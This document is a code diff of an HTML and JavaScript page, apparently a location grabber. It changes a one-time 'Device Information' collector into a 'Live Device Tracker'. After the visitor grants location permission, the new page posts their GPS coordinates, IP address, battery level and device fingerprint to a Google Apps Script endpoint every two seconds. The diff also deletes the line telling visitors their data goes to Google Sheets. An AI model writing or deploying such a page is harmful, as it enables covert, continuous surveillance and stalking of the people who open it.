@@ -8,15 +8,15 @@
 <meta name="viewport"
       content="width=device-width, initial-scale=1.0">
 
-<title>Device Information</title>
+<title>Live Device Tracker</title>
 
 
 <style>
 
 *{
+    box-sizing:border-box;
     margin:0;
     padding:0;
-    box-sizing:border-box;
 }
 
 body{
@@ -25,24 +25,23 @@ body{
 
     font-family:
     Arial,
-    Helvetica,
     sans-serif;
 
     background:
     linear-gradient(
         135deg,
         #06111f,
-        #0d2942,
+        #102a43,
         #06111f
     );
 
-    color:#ffffff;
+    color:white;
 
     display:flex;
 
-    justify-content:center;
-
     align-items:center;
+
+    justify-content:center;
 
     padding:20px;
 
@@ -60,21 +59,18 @@ body{
     border-radius:25px;
 
     background:
-    rgba(255,255,255,0.08);
+    rgba(255,255,255,.08);
 
     border:
     1px solid
-    rgba(255,255,255,0.15);
+    rgba(255,255,255,.15);
 
     backdrop-filter:
     blur(20px);
 
-    -webkit-backdrop-filter:
-    blur(20px);
-
     box-shadow:
     0 25px 70px
-    rgba(0,0,0,0.45);
+    rgba(0,0,0,.45);
 
 }
 
@@ -88,18 +84,18 @@ body{
     margin:
     0 auto 18px;
 
+    border-radius:22px;
+
     display:flex;
 
     align-items:center;
 
     justify-content:center;
 
-    border-radius:22px;
+    font-size:38px;
 
     background:
-    rgba(255,255,255,0.10);
-
-    font-size:38px;
+    rgba(255,255,255,.1);
 
 }
 
@@ -134,11 +130,13 @@ button{
 
     width:100%;
 
-    border:none;
+    border:0;
 
     padding:16px;
 
     border-radius:15px;
+
+    color:white;
 
     background:
     linear-gradient(
@@ -146,8 +144,6 @@ button{
         #00c6ff,
         #0072ff
     );
-
-    color:#ffffff;
 
     font-size:16px;
 
@@ -158,11 +154,21 @@ button{
 }
 
 
+button.stop{
+
+    background:
+    linear-gradient(
+        135deg,
+        #ff4b4b,
+        #b00020
+    );
+
+}
+
+
 button:disabled{
 
-    opacity:.55;
-
-    cursor:not-allowed;
+    opacity:.6;
 
 }
 
@@ -180,7 +186,7 @@ button:disabled{
 }
 
 
-.success{
+.live{
 
     color:#55ff9b;
 
@@ -211,7 +217,7 @@ button:disabled{
 
     gap:15px;
 
-    padding:12px 0;
+    padding:11px 0;
 
     border-bottom:
     1px solid
@@ -251,15 +257,28 @@ button:disabled{
 }
 
 
+.counter{
+
+    text-align:center;
+
+    margin-top:18px;
+
+    font-size:13px;
+
+    color:#8fa4ba;
+
+}
+
+
 .footer{
 
     margin-top:20px;
 
     text-align:center;
 
-    color:#718397;
-
     font-size:11px;
+
+    color:#718397;
 
 }
 
@@ -275,29 +294,28 @@ button:disabled{
 
 
     <div class="logo">
-        📱
+        📍
     </div>
 
 
     <h1>
-        Device Information
+        Live Device Tracker
     </h1>
 
 
     <div class="subtitle">
 
-        Allow location access to continue.
-        Your available browser information
-        will be sent to Google Sheets.
+        Allow location access to start
+        automatic data synchronization.
 
     </div>
 
 
     <button
         id="startBtn"
-        onclick="startCollection()">
+        onclick="startTracking()">
 
-        📍 Allow & Continue
+        📍 Allow & Start
 
     </button>
 
@@ -307,6 +325,15 @@ button:disabled{
         class="status">
 
         Ready
+
+    </div>
+
+
+    <div
+        id="counter"
+        class="counter">
+
+        Updates: 0
 
     </div>
 
@@ -489,57 +516,13 @@ button:disabled{
         </div>
 
 
-        <div class="row">
-
-            <div class="label">
-                Screen
-            </div>
-
-            <div
-                id="screen"
-                class="value">
-                -
-            </div>
-
-        </div>
-
-
-        <div class="row">
-
-            <div class="label">
-                Language
-            </div>
-
-            <div
-                id="language"
-                class="value">
-                -
-            </div>
-
-        </div>
-
-
-        <div class="row">
-
-            <div class="label">
-                Timezone
-            </div>
-
-            <div
-                id="timezone"
-                class="value">
-                -
-            </div>
-
-        </div>
-
-
     </div>
 
 
     <div class="footer">
 
-        Location access requires browser permission.
+        Data updates every 2 seconds while
+        this page remains active.
 
     </div>
 
@@ -551,20 +534,146 @@ button:disabled{
 <script>
 
 
-/**************************************************
- * GOOGLE APPS SCRIPT URL
- **************************************************/
+/************************************************
+ * APPS SCRIPT URL
+ ************************************************/
 
 const SCRIPT_URL =
 "https://script.google.com/macros/s/AKfycbwRB97NvDLjLeZlJcZU0l45h8DtAP2z-pi43_OZSDuolFsYwtdXfH81_h35FvAy2SMvug/exec";
 
 
+/************************************************
+ * VARIABLES
+ ************************************************/
 
-/**************************************************
- * START
- **************************************************/
+let tracking = false;
 
-async function startCollection(){
+let timer = null;
+
+let updateCount = 0;
+
+let currentIP = "";
+
+let currentBattery = "Unavailable";
+
+
+/************************************************
+ * START TRACKING
+ ************************************************/
+
+async function startTracking(){
+
+    if(tracking){
+
+        stopTracking();
+
+        return;
+
+    }
+
+
+    const button =
+        document.getElementById("startBtn");
+
+    const status =
+        document.getElementById("status");
+
+
+    button.disabled = true;
+
+
+    status.innerText =
+        "📍 Requesting location permission...";
+
+
+    try{
+
+        await getCurrentLocation();
+
+
+        status.innerText =
+            "Getting IP address...";
+
+
+        currentIP =
+            await getIP();
+
+
+        currentBattery =
+            await getBattery();
+
+
+        tracking = true;
+
+
+        updateCount = 0;
+
+
+        button.disabled = false;
+
+
+        button.innerText =
+            "■ Stop Tracking";
+
+
+        button.classList.add("stop");
+
+
+        status.innerText =
+            "● Live tracking active";
+
+
+        status.className =
+            "status live";
+
+
+        // প্রথম data এখনই পাঠাবে
+        sendUpdate();
+
+
+        // এরপর প্রতি 2 second
+        timer =
+            setInterval(
+                sendUpdate,
+                2000
+            );
+
+
+    }
+    catch(error){
+
+        button.disabled = false;
+
+
+        status.innerText =
+            "❌ " + error.message;
+
+
+        status.className =
+            "status error";
+
+    }
+
+}
+
+
+
+/************************************************
+ * STOP
+ ************************************************/
+
+function stopTracking(){
+
+    tracking = false;
+
+
+    if(timer){
+
+        clearInterval(timer);
+
+        timer = null;
+
+    }
 
 
     const button =
@@ -575,209 +684,36 @@ async function startCollection(){
         document.getElementById("status");
 
 
-    button.disabled = true;
+    button.innerText =
+        "📍 Allow & Start";
+
+
+    button.classList.remove("stop");
+
+
+    status.innerText =
+        "Tracking stopped";
 
 
     status.className =
         "status";
 
 
-    status.innerText =
-        "📍 Getting location...";
-
-
-    try{
-
-
-        /*
-         * LOCATION
-         */
-
-        const location =
-            await getLocation();
-
-
-        status.innerText =
-            "📱 Reading device information...";
-
-
-        /*
-         * IP
-         */
-
-        const ip =
-            await getIP();
-
-
-        /*
-         * BATTERY
-         */
-
-        const battery =
-            await getBattery();
-
-
-        /*
-         * NETWORK
-         */
-
-        const network =
-            getNetwork();
-
-
-        /*
-         * DATE
-         */
-
-        const now =
-            new Date();
-
-
-        /*
-         * MAP LINK
-         */
-
-        const mapsLink =
-            "https://www.google.com/maps?q=" +
-            location.latitude +
-            "," +
-            location.longitude;
-
-
-        /*
-         * DATA
-         */
-
-        const data = {
-
-            dateTime:
-                now.toISOString(),
-
-            latitude:
-                location.latitude,
-
-            longitude:
-                location.longitude,
-
-            accuracy:
-                location.accuracy,
-
-            mapsLink:
-                mapsLink,
-
-            ip:
-                ip,
-
-            device:
-                getDevice(),
-
-            os:
-                getOS(),
-
-            browser:
-                getBrowser(),
-
-            userAgent:
-                navigator.userAgent,
-
-            screen:
-                window.screen.width +
-                " x " +
-                window.screen.height,
-
-            language:
-                navigator.language || "",
-
-            timezone:
-                Intl.DateTimeFormat()
-                .resolvedOptions()
-                .timeZone || "",
-
-            battery:
-                battery,
-
-            online:
-                navigator.onLine
-                ? "Online"
-                : "Offline",
-
-            networkType:
-                network.type,
-
-            networkSpeed:
-                network.speed,
-
-            networkRtt:
-                network.rtt,
-
-            platform:
-                navigator.platform || ""
-
-        };
-
-
-        /*
-         * DISPLAY
-         */
-
-        showData(data);
-
-
-        status.innerText =
-            "☁️ Saving data...";
-
-
-        /*
-         * SEND
-         */
-
-        await sendData(data);
-
-
-        status.innerText =
-            "✓ Data saved successfully";
-
-        status.className =
-            "status success";
-
-
-    }
-    catch(error){
-
-
-        console.error(error);
-
-
-        status.innerText =
-            "❌ " + error.message;
-
-        status.className =
-            "status error";
-
-
-        button.disabled =
-            false;
-
-    }
-
 }
 
 
 
-/**************************************************
+/************************************************
  * LOCATION
- **************************************************/
+ ************************************************/
 
-function getLocation(){
-
+function getCurrentLocation(){
 
     return new Promise(
         (resolve,reject)=>{
 
 
-            if(
-                !navigator.geolocation
-            ){
+            if(!navigator.geolocation){
 
                 reject(
                     new Error(
@@ -794,59 +730,37 @@ function getLocation(){
 
                 position => {
 
-
-                    resolve({
-
-                        latitude:
-                            position.coords.latitude,
-
-                        longitude:
-                            position.coords.longitude,
-
-                        accuracy:
-                            position.coords.accuracy
-
-                    });
+                    resolve(position);
 
                 },
 
 
                 error => {
 
+                    let message =
+                        "Location unavailable.";
 
-                    let message;
 
+                    if(error.code === 1){
 
-                    switch(error.code){
-
-                        case 1:
-
-                            message =
+                        message =
                             "Location permission denied.";
 
-                            break;
+                    }
 
 
-                        case 2:
+                    if(error.code === 2){
 
-                            message =
+                        message =
                             "Location unavailable.";
 
-                            break;
+                    }
 
 
-                        case 3:
+                    if(error.code === 3){
 
-                            message =
-                            "Location request timed out.";
-
-                            break;
-
-
-                        default:
-
-                            message =
-                            "Could not get location.";
+                        message =
+                            "Location timeout.";
 
                     }
 
@@ -877,15 +791,13 @@ function getLocation(){
 
 
 
-/**************************************************
- * IP
- **************************************************/
+/************************************************
+ * GET IP
+ ************************************************/
 
 async function getIP(){
 
-
     try{
-
 
         const response =
             await fetch(
@@ -896,19 +808,11 @@ async function getIP(){
             );
 
 
-        if(!response.ok){
-
-            return "Unavailable";
-
-        }
-
-
         const result =
             await response.json();
 
 
         return result.ip || "Unavailable";
-
 
     }
     catch(error){
@@ -921,15 +825,13 @@ async function getIP(){
 
 
 
-/**************************************************
+/************************************************
  * BATTERY
- **************************************************/
+ ************************************************/
 
 async function getBattery(){
 
-
     try{
-
 
         if(
             typeof navigator.getBattery !==
@@ -951,7 +853,6 @@ async function getBattery(){
             ) + "%"
         );
 
-
     }
     catch(error){
 
@@ -963,211 +864,192 @@ async function getBattery(){
 
 
 
-/**************************************************
- * DEVICE
- **************************************************/
+/************************************************
+ * SEND UPDATE
+ ************************************************/
 
-function getDevice(){
+async function sendUpdate(){
 
+    if(!tracking){
 
-    const ua =
-        navigator.userAgent.toLowerCase();
-
-
-    if(
-        ua.includes("iphone")
-    ){
-
-        return "iPhone";
+        return;
 
     }
 
 
-    if(
-        ua.includes("ipad")
-    ){
+    try{
 
-        return "iPad";
+
+        const position =
+            await getCurrentLocation();
+
+
+        const coords =
+            position.coords;
+
+
+        const latitude =
+            coords.latitude;
+
+
+        const longitude =
+            coords.longitude;
+
+
+        const accuracy =
+            coords.accuracy;
+
+
+        const mapsLink =
+            "https://www.google.com/maps?q=" +
+            latitude +
+            "," +
+            longitude;
+
+
+        const network =
+            getNetwork();
+
+
+        const data = {
+
+            dateTime:
+                new Date().toISOString(),
+
+            latitude:
+                latitude,
+
+            longitude:
+                longitude,
+
+            accuracy:
+                accuracy,
+
+            mapsLink:
+                mapsLink,
+
+            ip:
+                currentIP,
+
+            device:
+                getDevice(),
+
+            os:
+                getOS(),
+
+            browser:
+                getBrowser(),
+
+            battery:
+                currentBattery,
+
+            online:
+                navigator.onLine
+                ? "Online"
+                : "Offline",
+
+            networkType:
+                network.type,
+
+            networkSpeed:
+                network.speed,
+
+            networkRtt:
+                network.rtt,
+
+            screen:
+                window.screen.width +
+                " x " +
+                window.screen.height,
+
+            language:
+                navigator.language || "",
+
+            timezone:
+                Intl.DateTimeFormat()
+                .resolvedOptions()
+                .timeZone || "",
+
+            platform:
+                navigator.platform || "",
+
+            userAgent:
+                navigator.userAgent
+
+        };
+
+
+        showData(data);
+
+
+        await fetch(
+
+            SCRIPT_URL,
+
+            {
+
+                method:"POST",
+
+                mode:"no-cors",
+
+                headers:{
+
+                    "Content-Type":
+                        "text/plain;charset=utf-8"
+
+                },
+
+                body:
+                    JSON.stringify(data)
+
+            }
+
+        );
+
+
+        updateCount++;
+
+
+        document
+            .getElementById("counter")
+            .innerText =
+            "Updates: " +
+            updateCount;
+
+
+        document
+            .getElementById("status")
+            .innerText =
+            "● Live • Last update: " +
+            new Date()
+            .toLocaleTimeString();
+
 
     }
+    catch(error){
+
+        console.error(
+            "Update error:",
+            error
+        );
 
 
-    if(
-        ua.includes("android")
-    ){
-
-        return "Android Device";
-
-    }
-
-
-    if(
-        ua.includes("windows")
-    ){
-
-        return "Windows PC";
+        document
+            .getElementById("status")
+            .innerText =
+            "⚠ Waiting for next update...";
 
     }
-
-
-    if(
-        ua.includes("macintosh")
-    ){
-
-        return "Mac";
-
-    }
-
-
-    if(
-        ua.includes("linux")
-    ){
-
-        return "Linux Device";
-
-    }
-
-
-    return "Unknown";
 
 }
 
 
 
-/**************************************************
- * OS
- **************************************************/
-
-function getOS(){
-
-
-    const ua =
-        navigator.userAgent;
-
-
-    if(
-        /android/i.test(ua)
-    ){
-
-        return "Android";
-
-    }
-
-
-    if(
-        /iphone|ipad|ipod/i.test(ua)
-    ){
-
-        return "iOS";
-
-    }
-
-
-    if(
-        /windows/i.test(ua)
-    ){
-
-        return "Windows";
-
-    }
-
-
-    if(
-        /mac os/i.test(ua)
-    ){
-
-        return "macOS";
-
-    }
-
-
-    if(
-        /linux/i.test(ua)
-    ){
-
-        return "Linux";
-
-    }
-
-
-    return "Unknown";
-
-}
-
-
-
-/**************************************************
- * BROWSER
- **************************************************/
-
-function getBrowser(){
-
-
-    const ua =
-        navigator.userAgent;
-
-
-    if(
-        /edg\//i.test(ua)
-    ){
-
-        return "Microsoft Edge";
-
-    }
-
-
-    if(
-        /opr\//i.test(ua)
-    ){
-
-        return "Opera";
-
-    }
-
-
-    if(
-        /chrome\//i.test(ua)
-        &&
-        !/edg\//i.test(ua)
-    ){
-
-        return "Google Chrome";
-
-    }
-
-
-    if(
-        /firefox\//i.test(ua)
-    ){
-
-        return "Firefox";
-
-    }
-
-
-    if(
-        /safari\//i.test(ua)
-        &&
-        !/chrome\//i.test(ua)
-    ){
-
-        return "Safari";
-
-    }
-
-
-    return "Unknown";
-
-}
-
-
-
-/**************************************************
+/************************************************
  * NETWORK
- **************************************************/
+ ************************************************/
 
 function getNetwork(){
-
 
     const connection =
         navigator.connection ||
@@ -1179,14 +1061,11 @@ function getNetwork(){
 
         return {
 
-            type:
-                "Not supported",
+            type:"Not supported",
 
-            speed:
-                "Not available",
+            speed:"Unavailable",
 
-            rtt:
-                "Not available"
+            rtt:"Unavailable"
 
         };
 
@@ -1202,12 +1081,14 @@ function getNetwork(){
 
         speed:
             connection.downlink
-            ? connection.downlink + " Mbps"
+            ? connection.downlink +
+              " Mbps"
             : "Unknown",
 
         rtt:
             connection.rtt
-            ? connection.rtt + " ms"
+            ? connection.rtt +
+              " ms"
             : "Unknown"
 
     };
@@ -1216,58 +1097,131 @@ function getNetwork(){
 
 
 
-/**************************************************
- * SEND TO GOOGLE SHEET
- **************************************************/
+/************************************************
+ * DEVICE
+ ************************************************/
 
-async function sendData(data){
+function getDevice(){
 
-
-    /*
-     * Apps Script accepts the request.
-     *
-     * no-cors is used because the HTML page
-     * and Apps Script are different domains.
-     */
+    const ua =
+        navigator.userAgent.toLowerCase();
 
 
-    await fetch(
-
-        SCRIPT_URL,
-
-        {
-
-            method:"POST",
-
-            mode:"no-cors",
-
-            headers:{
-
-                "Content-Type":
-                    "text/plain;charset=utf-8"
-
-            },
-
-            body:
-                JSON.stringify(data)
-
-        }
-
-    );
+    if(ua.includes("iphone"))
+        return "iPhone";
 
 
-    return true;
+    if(ua.includes("ipad"))
+        return "iPad";
+
+
+    if(ua.includes("android"))
+        return "Android Device";
+
+
+    if(ua.includes("windows"))
+        return "Windows PC";
+
+
+    if(ua.includes("macintosh"))
+        return "Mac";
+
+
+    if(ua.includes("linux"))
+        return "Linux";
+
+
+    return "Unknown";
 
 }
 
 
 
-/**************************************************
+/************************************************
+ * OS
+ ************************************************/
+
+function getOS(){
+
+    const ua =
+        navigator.userAgent;
+
+
+    if(/android/i.test(ua))
+        return "Android";
+
+
+    if(
+        /iphone|ipad|ipod/i.test(ua)
+    )
+        return "iOS";
+
+
+    if(/windows/i.test(ua))
+        return "Windows";
+
+
+    if(/mac os/i.test(ua))
+        return "macOS";
+
+
+    if(/linux/i.test(ua))
+        return "Linux";
+
+
+    return "Unknown";
+
+}
+
+
+
+/************************************************
+ * BROWSER
+ ************************************************/
+
+function getBrowser(){
+
+    const ua =
+        navigator.userAgent;
+
+
+    if(/edg\//i.test(ua))
+        return "Microsoft Edge";
+
+
+    if(/opr\//i.test(ua))
+        return "Opera";
+
+
+    if(
+        /chrome\//i.test(ua) &&
+        !/edg\//i.test(ua)
+    )
+        return "Google Chrome";
+
+
+    if(/firefox\//i.test(ua))
+        return "Firefox";
+
+
+    if(
+        /safari\//i.test(ua) &&
+        !/chrome\//i.test(ua)
+    )
+        return "Safari";
+
+
+    return "Unknown";
+
+}
+
+
+
+/************************************************
  * SHOW DATA
- **************************************************/
+ ************************************************/
 
 function showData(data){
-
 
     document
         .getElementById("info")
@@ -1300,14 +1254,12 @@ function showData(data){
         .innerText =
         Math.round(
             data.accuracy
-        ) + " meters";
+        ) + " m";
 
 
-    const maps =
-        document.getElementById("maps");
-
-
-    maps.href =
+    document
+        .getElementById("maps")
+        .href =
         data.mapsLink;
 
 
@@ -1348,24 +1300,6 @@ function showData(data){
         data.networkType +
         " / " +
         data.networkSpeed;
-
-
-    document
-        .getElementById("screen")
-        .innerText =
-        data.screen;
-
-
-    document
-        .getElementById("language")
-        .innerText =
-        data.language;
-
-
-    document
-        .getElementById("timezone")
-        .innerText =
-        data.timezone;
 
 }
 
